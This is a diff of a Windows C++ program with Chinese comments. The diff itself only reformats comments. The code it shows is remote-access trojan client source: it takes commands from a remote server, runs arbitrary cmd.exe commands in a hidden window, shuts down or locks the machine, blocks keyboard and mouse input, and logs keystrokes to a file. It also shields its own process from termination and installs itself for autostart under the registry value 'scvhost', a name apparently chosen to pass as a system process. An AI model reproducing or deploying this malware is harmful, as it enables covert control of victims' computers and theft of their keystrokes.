@@ -9,12 +9,12 @@ char* ServerIp;
 int ServerPort;
 
 
-//执行命令
+// 执行命令
 int cmd(char *cmdStr, char *message)
 {
 	DWORD readByte = 0;
 	char command[1024] = { 0 };
-	char buf[MSG_LENN] = { 0 }; //缓冲区
+	char buf[MSG_LENN] = { 0 };  // 缓冲区
 
 	HANDLE hRead, hWrite;
 	STARTUPINFO si;         // 启动配置信息
@@ -38,7 +38,7 @@ int cmd(char *cmdStr, char *message)
 	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
 	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
 
-											// 拼接 cmd 命令
+	// 拼接 cmd 命令
 	sprintf(command, "cmd.exe /c %s", cmdStr);
 
 	// 创建子进程,运行命令,子进程是可继承的
@@ -50,7 +50,7 @@ int cmd(char *cmdStr, char *message)
 	}
 	CloseHandle(hWrite);
 
-	//读取管道的read端,获得cmd输出
+	// 读取管道的read端,获得cmd输出
 	while (ReadFile(hRead, buf, MSG_LENN, &readByte, NULL)) {
 		strcat(message, buf);
 		ZeroMemory(buf, MSG_LENN);
@@ -81,7 +81,7 @@ void c_socket()
 		return;
 	}
 
-	//获取主机名、用户名
+	// 获取主机名、用户名
 	const int MAX_BUFFER_LEN = 500;
 	char userName[MAX_BUFFER_LEN];
 	char comName[MAX_BUFFER_LEN];
@@ -111,16 +111,16 @@ void c_socket()
 		}
 	}
 
-	//阻塞等待服务端指令
+	// 阻塞等待服务端指令
 	char recvCmd[MSG_LEN] = { 0 };
 	char message[MSG_LENN + 10] = { 0 };
 	while (1) {
 		ZeroMemory(recvCmd, sizeof(recvCmd));
 		ZeroMemory(message, sizeof(message));
 
-		//从服务端获取数据
+		// 从服务端获取数据
 		recv(client, recvCmd, MSG_LEN, 0);
-		if (strlen(recvCmd)<1) {  //SOCKET中断重连
+		if (strlen(recvCmd)<1) {  // SOCKET中断重连
 			closesocket(client);
 			while (1) {
 				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -135,38 +135,38 @@ void c_socket()
 			}
 			continue;
 		}
-		else if (strcmp(recvCmd, "shutdown") == 0) {  //关机
+		else if (strcmp(recvCmd, "shutdown") == 0) {  // 关机
 			system("shutdown -s -t 20");
 			continue;
 		}
-		else if (strcmp(recvCmd, "reboot") == 0) {  //重启
+		else if (strcmp(recvCmd, "reboot") == 0) {  // 重启
 			system("shutdown -r -t 20");
 			continue;
 		}
-		else if (strcmp(recvCmd, "cancel") == 0) {  //取消关机
+		else if (strcmp(recvCmd, "cancel") == 0) {  // 取消关机
 			system("shutdown -a");
 			continue;
 		}
-		else if (strcmp(recvCmd, "close") == 0) {  //关闭客户端
+		else if (strcmp(recvCmd, "close") == 0) {  // 关闭客户端
 			send(client, "Client has exit!", 16, 0);
 			exit(0);
 		}
-		else if (strcmp(recvCmd, "screenshot") == 0) {  //截屏
+		else if (strcmp(recvCmd, "screenshot") == 0) {  // 截屏
 			continue;
 		}
-		else if (strcmp(recvCmd, "lock") == 0) { //锁屏
+		else if (strcmp(recvCmd, "lock") == 0) {  // 锁屏
 			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
 			continue;
 		}
-		else if (strcmp(recvCmd, "blockinput") == 0) { //冻结鼠标和键盘
+		else if (strcmp(recvCmd, "blockinput") == 0) {  // 冻结鼠标和键盘
 			BlockInput(true);
 			continue;
 		}
-		else if (strcmp(recvCmd, "input") == 0) { //释放鼠标和键盘
+		else if (strcmp(recvCmd, "input") == 0) {  // 释放鼠标和键盘
 			BlockInput(false);
 			continue;
 		}
-		else if (strcmp(recvCmd, "keylogger") == 0)//键盘记录
+		else if (strcmp(recvCmd, "keylogger") == 0)  // 键盘记录
 		{
 			char keylog[MAX_PATH];
 			GetCurrentDirectoryA(MAX_PATH, keylog);
@@ -180,21 +180,21 @@ void c_socket()
 				Sleep(5);
 				for (int i = 8; i <= 255; i++)
 				{
-					if (GetAsyncKeyState(i) & 1 == 1)               //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
+					if (GetAsyncKeyState(i) & 1 == 1)  // 判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
 					{
 						KeyName = GetKeyName(i);
 						FileStream.write(KeyName.c_str(), KeyName.size());
-						FileStream.close();                                //写完一次就保存一次
+						FileStream.close();  // 写完一次就保存一次
 						FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
 					}
 				}
 
 			}
 		}
-		else if (strcmp(recvCmd, "download") == 0) { //上传文件
+		else if (strcmp(recvCmd, "download") == 0) {  // 上传文件
 			continue;
 		}
-		else if (strcmp(recvCmd, "upload") == 0) { //下载文件
+		else if (strcmp(recvCmd, "upload") == 0) {  // 下载文件
 			continue;
 		}
 		else if ((recvCmd[0] == '$')) {
@@ -217,12 +217,12 @@ void c_socket()
 }
 
 
-//键盘记录
+// 键盘记录
 string GetKeyName(int NumKey)
 {
 	bool IS_SHIFT = JudgeShift();
 	string revalue = "";
-	//判断键盘中间的特殊符号
+	// 判断键盘中间的特殊符号
 	if (NumKey >= 186 && NumKey <= 222)
 		switch (NumKey)
 		{
@@ -297,9 +297,9 @@ string GetKeyName(int NumKey)
 		}
 
 
-	if (NumKey == VK_ESCAPE) // 退出
+	if (NumKey == VK_ESCAPE)  // 退出
 		revalue = "[Esc]";
-	else if (NumKey == VK_F1) // F1至F12
+	else if (NumKey == VK_F1)  // F1至F12
 		revalue = "[F1]";
 	else if (NumKey == VK_F2)
 		revalue = "[F2]";
@@ -323,62 +323,62 @@ string GetKeyName(int NumKey)
 		revalue = "[F11]";
 	else if (NumKey == VK_F12)
 		revalue = "[F12]";
-	else if (NumKey == VK_SNAPSHOT) // 打印屏幕
+	else if (NumKey == VK_SNAPSHOT)  // 打印屏幕
 		revalue = "[PrScrn]";
-	else if (NumKey == VK_SCROLL) // 滚动锁定
+	else if (NumKey == VK_SCROLL)  // 滚动锁定
 		revalue = "[Scroll Lock]";
-	else if (NumKey == VK_PAUSE) // 暂停、中断
+	else if (NumKey == VK_PAUSE)  // 暂停、中断
 		revalue = "[Pause]";
-	else if (NumKey == VK_CAPITAL) // 大写锁定
+	else if (NumKey == VK_CAPITAL)  // 大写锁定
 		revalue = "[Caps Lock]";
-	else if (NumKey == 8) //<- 回格键
+	else if (NumKey == 8)  //<- 退格键
 		revalue = "[Backspace]";
-	else if (NumKey == VK_RETURN) // 回车键、换行
+	else if (NumKey == VK_RETURN)  // 回车键、换行
 		revalue = "[Enter]\n";
-	else if (NumKey == VK_SPACE) // 空格
+	else if (NumKey == VK_SPACE)  // 空格
 		revalue = " ";
-	else if (NumKey == VK_TAB) // 制表键
+	else if (NumKey == VK_TAB)  // 制表键
 		revalue = "[Tab]";
-	else if (NumKey == VK_LCONTROL) // 左控制键
+	else if (NumKey == VK_LCONTROL)  // 左控制键
 		revalue = "[Ctrl]";
-	else if (NumKey == VK_RCONTROL) // 右控制键
+	else if (NumKey == VK_RCONTROL)  // 右控制键
 		revalue = "[CTRL]";
-	else if (NumKey == VK_LMENU) // 左换档键
+	else if (NumKey == VK_LMENU)  // 左换档键
 		revalue = "[Alt]";
-	else if (NumKey == VK_LMENU) // 右换档键
+	else if (NumKey == VK_LMENU)  // 右换档键
 		revalue = "[ALT]";
-	else if (NumKey == VK_LWIN) // 右 WINDOWS 键
+	else if (NumKey == VK_LWIN)  // 右 WINDOWS 键
 		revalue = "[Win]";
-	else if (NumKey == VK_RWIN) // 右 WINDOWS 键
+	else if (NumKey == VK_RWIN)  // 右 WINDOWS 键
 		revalue = "[WIN]";
-	else if (NumKey == VK_APPS) // 键盘上 右键
+	else if (NumKey == VK_APPS)  // 键盘上 右键
 		revalue = "右键";
-	else if (NumKey == VK_INSERT) // 插入
+	else if (NumKey == VK_INSERT)  // 插入
 		revalue = "[Insert]";
-	else if (NumKey == VK_DELETE) // 删除
+	else if (NumKey == VK_DELETE)  // 删除
 		revalue = "[Delete]";
-	else if (NumKey == VK_HOME) // 起始
+	else if (NumKey == VK_HOME)  // 起始
 		revalue = "[Home]";
-	else if (NumKey == VK_END) // 结束
+	else if (NumKey == VK_END)  // 结束
 		revalue = "[End]";
-	else if (NumKey == VK_PRIOR) // 上一页
+	else if (NumKey == VK_PRIOR)  // 上一页
 		revalue = "[PgUp]";
-	else if (NumKey == VK_NEXT) // 下一页
+	else if (NumKey == VK_NEXT)  // 下一页
 		revalue = "[PgDown]";
 	// 不常用的几个键:一般键盘没有
-	else if (NumKey == VK_CANCEL) // Cancel
+	else if (NumKey == VK_CANCEL)  // Cancel
 		revalue = "[Cancel]";
-	else if (NumKey == VK_CLEAR) // Clear
+	else if (NumKey == VK_CLEAR)  // Clear
 		revalue = "[Clear]";
-	else if (NumKey == VK_SELECT) //Select
+	else if (NumKey == VK_SELECT)  // Select
 		revalue = "[Select]";
-	else if (NumKey == VK_PRINT) //Print
+	else if (NumKey == VK_PRINT)  // Print
 		revalue = "[Print]";
-	else if (NumKey == VK_EXECUTE) //Execute
+	else if (NumKey == VK_EXECUTE)  // Execute
 		revalue = "[Execute]";
 
 	//----------------------------------------//
-	else if (NumKey == VK_LEFT) //上、下、左、右键
+	else if (NumKey == VK_LEFT)  // 上、下、左、右键
 		revalue = "[←]";
 	else if (NumKey == VK_RIGHT)
 		revalue = "[→]";
@@ -386,9 +386,9 @@ string GetKeyName(int NumKey)
 		revalue = "[↑]";
 	else if (NumKey == VK_DOWN)
 		revalue = "[↓]";
-	else if (NumKey == VK_NUMLOCK)//小键盘数码锁定
+	else if (NumKey == VK_NUMLOCK)  // 小键盘数码锁定
 		revalue = "[NumLock]";
-	else if (NumKey == VK_ADD) // 加、减、乘、除
+	else if (NumKey == VK_ADD)  // 加、减、乘、除
 		revalue = "+";
 	else if (NumKey == VK_SUBTRACT)
 		revalue = "-";
@@ -396,9 +396,9 @@ string GetKeyName(int NumKey)
 		revalue = "*";
 	else if (NumKey == VK_DIVIDE)
 		revalue = "/";
-	else if (NumKey == 190 || NumKey == 110) // 小键盘 . 及键盘 .
+	else if (NumKey == 190 || NumKey == 110)  // 小键盘 . 及键盘 .
 		revalue = ".";
-	//小键盘数字键:0-9
+	// 小键盘数字键:0-9
 	else if (NumKey == VK_NUMPAD0)
 		revalue = "0";
 	else if (NumKey == VK_NUMPAD1)
@@ -479,8 +479,8 @@ string GetKeyName(int NumKey)
 
 bool JudgeShift()
 {
-	int iShift = GetKeyState(0x10); //判断Shift键状态
-	bool IS = (iShift & KeyBoardValue) == KeyBoardValue; //表示按下Shift键
+	int iShift = GetKeyState(0x10);  // 判断Shift键状态
+	bool IS = (iShift & KeyBoardValue) == KeyBoardValue;  // 表示按下Shift键
 	if (IS)
 		return 1;
 	else
@@ -488,7 +488,7 @@ bool JudgeShift()
 }
 
 
-//Ring3保护
+// Ring3保护
 BOOL Ring3ProtectProcess()
 {
 	HANDLE hProcess = ::GetCurrentProcess();
@@ -504,7 +504,7 @@ BOOL Ring3ProtectProcess()
 	::GetTokenInformation(hToken, TokenUser, NULL, NULL, &dwReturnLength);
 	if (dwReturnLength > 0x400) goto Cleanup;
 	LPVOID TokenInformation;
-	TokenInformation = ::LocalAlloc(LPTR, 0x400);//这里就引用SDK的函数不引用CRT的了  
+	TokenInformation = ::LocalAlloc(LPTR, 0x400);
 	DWORD dw;
 	bSus = ::GetTokenInformation(hToken, TokenUser, TokenInformation, 0x400, &dw);
 	if (!bSus) goto Cleanup;
@@ -528,24 +528,24 @@ Cleanup:
 }
 
 
-//自动运行
+// 自动运行
 int autoRun()
 {
-	//写入注册表,开机自启动 
+	// 写入注册表,开机自启动
 	HKEY hKey;
-	//找到系统的启动项
+	// 找到系统的启动项
 	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	//打开启动项Key
+	// 打开启动项Key
 	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
 	if (lRet == ERROR_SUCCESS)
 	{
 		char pFileName[MAX_PATH] = { 0 };
-		//得到程序自身的全路径
+		// 得到程序自身的全路径
 		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
-		//添加一个子键,并设置值
+		// 添加一个子键,并设置值
 		lRet = RegSetValueEx(hKey, "scvhost", 0, REG_SZ, (BYTE *)pFileName, dwRet);
 
-		//关闭注册表
+		// 关闭注册表
 		RegCloseKey(hKey);
 	}
 
